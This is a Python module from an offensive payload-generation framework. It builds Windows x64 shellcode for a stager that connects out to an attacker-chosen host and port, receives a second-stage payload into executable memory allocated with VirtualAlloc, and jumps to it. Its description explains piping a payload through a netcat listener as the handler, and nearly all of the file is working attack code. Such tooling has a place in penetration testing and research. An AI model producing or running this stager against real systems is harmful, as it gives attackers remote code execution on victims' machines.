import sys
import math
import ctypes
import struct

from sickle.common.lib.generic import extract
from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.programmer import builder
from sickle.common.lib.programmer import stubhub

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    winnt,
    ws2def,
    winternl
)

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) VirtualAlloc Shellcode Loader"

    module = f"{platform}/{arch}/virtualalloc_exec_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]

    summary = ("A lightweight stager that connects to a handler via TCP over IPv4 to receive and execute shellcode")

    description = ("This shellcode stub connects to a remote server handler over TCP, downloads a second-stage"
                   " payload, and executes it.\n\n"

                   "Your handler can be as simple as combining Sickle and Netcat:\n\n"

                   f"    {sys.argv[0]} -p windows/x64/reflective_pe EXE=/path/doom.exe -f raw | nc -lvp 8080\n\n"

                   "Upon execution of the first stage, you should get a connection from the target on your"
                   " handler. If using Netcat, hit [CTRL]+[C]. Upon doing so, your shellcode should execute"
                   " in memory.")

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "VirtualAlloc",
            ],
            "Ws2_32.dll" : [
                "WSAStartup",
                "socket",
                "connect",
                "recv",
            ],
        }

        self.set_args()

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({
            "wsaData"                       : 0x00,
            "sockaddr_name"                 : 0x00,
            "sockfd"                        : 0x00,
            "pResponse"                     : 0x00,
            "lpvShellcode"                  : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)
        self.sock_buffer_size = 0x1000 * 1100

        return

    def set_args(self):
        """Configure the arguments that may be used by the shellcode stub
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            self.lport = 4444
        else:
            self.lport = int(argv_dict["LPORT"])

        self.lhost = argv_dict['LHOST']

        return 0

    def gen_main(self):
        """Returns assembly source code for the main functionality of the stub
        """

        sin_port = struct.pack('<H', self.lport).hex()
        sin_family = struct.pack('>H', ws2def.AF_INET).hex()
        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))

        src = f"""
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
    call rax

call_socket:
    mov rcx, {ws2def.AF_INET}
    xor rdx, rdx
    inc dl
    xor r8, r8
    mov rax, [rbp - {self.storage_offsets['socket']}]
    call rax
    mov [rbp - {self.storage_offsets['sockfd']}], rax

call_connect:
    mov rcx, rax
    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
    lea rdx, [rbp - {self.storage_offsets['sockaddr_name']}]
    mov r9, {sin_addr}{sin_port}{sin_family}
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 0x08], r9
    mov rax, [rbp - {self.storage_offsets['connect']}]
    call rax

    xor rdx, rdx
    mov [rbp - {self.storage_offsets['lpvShellcode']}], rdx
    mov [rbp - {self.storage_offsets['pResponse']}], rdx

call_VirtualAlloc:
    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
    mov rdx, {self.sock_buffer_size}
    mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
    mov r9, {winnt.PAGE_EXECUTE_READWRITE}
    mov rax, [rbp - {self.storage_offsets['VirtualAlloc']}]
    call rax

    mov [rbp - {self.storage_offsets['lpvShellcode']}] , rax
    mov [rbp - {self.storage_offsets['pResponse']}], rax

call_recv:
    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    mov r8, 0x5000
    xor r9, r9
    mov rax, [rbp - {self.storage_offsets['recv']}]
    call rax

check_complete:
    test eax, eax
    jle download_complete

inc_ptr:
    mov r8, [rbp - {self.storage_offsets['pResponse']}]
    add r8, rax
    mov [rbp - {self.storage_offsets['pResponse']}], r8
    jmp call_recv

download_complete:
    jmp [rbp - {self.storage_offsets['lpvShellcode']}]
        """

        return src

    def get_shellcode(self):
        """Generates shellcode
        """

        generator = Assembler(Shellcode.arch)
        win_stubs = stubhub.WinRawr(self.storage_offsets,
                                    self.dependencies,
                                    self.stack_space,
                                    None)

        main_src = self.gen_main()
        src = win_stubs.gen_source(main_src)
        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
